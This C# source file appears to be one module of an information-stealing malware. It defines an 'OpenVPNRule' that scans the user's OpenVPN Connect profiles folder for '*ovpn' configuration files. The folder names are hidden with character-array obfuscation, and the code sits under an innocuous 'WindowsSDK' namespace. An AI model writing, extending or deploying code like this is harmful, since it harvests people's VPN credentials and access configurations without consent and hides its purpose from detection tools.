using System;
using System.Collections.Generic;
using System.IO;
using WindowsSDK.Objects.Files;

namespace WindowsSDK.Data.Files.Rules
{
    public class OpenVPNRule : FileScannerRule
    {
        public override string GetFolder(FileScannerArg scannerArg, FileInfo fileInfo)
        {
            return string.Empty;
        }

        public override IEnumerable<FileScannerArg> GetScanArgs()
        {
            List<FileScannerArg> list = new List<FileScannerArg>();
            try
            {
                list.Add(new FileScannerArg
                {
                    Directory = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%\\AppData\\Roaming"), new string(new char[36]
                    {
                        'O', 'p', 'H', 'a', 'n', 'd', 'l', 'e', 'r', 'e',
                        'n', 'V', 'P', 'H', 'a', 'n', 'd', 'l', 'e', 'r',
                        'N', ' ', 'C', 'o', 'n', 'H', 'a', 'n', 'd', 'l',
                        'e', 'r', 'n', 'e', 'c', 't'
                    }).Replace("Handler", string.Empty) + "\\" + new string(new char[8] { 'p', 'r', 'o', 'f', 'i', 'l', 'e', 's' })),
                    Pattern = "*ovpn",
                    Recoursive = false
                });
            }
            catch
            {
            }
            return list;
        }
    }
}
